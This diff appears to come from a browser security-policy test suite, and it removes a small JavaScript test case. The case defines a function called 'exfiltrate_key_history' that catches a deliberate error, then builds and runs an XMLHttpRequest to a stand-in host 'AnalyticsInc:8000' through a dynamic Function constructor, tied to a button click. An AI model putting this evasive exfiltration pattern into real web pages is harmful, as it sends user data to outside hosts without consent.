@@ -1,5 +1,0 @@
-
-JAM.startProfile('load');
-function exfiltrate_key_history(){try{window.NotExistingFunction()}catch(e){var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=error2", true);xmlhttp.send(null);',exp=JAM.new(Function,[exp]);exp()}}JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history);
-
-JAM.stopProfile('load');
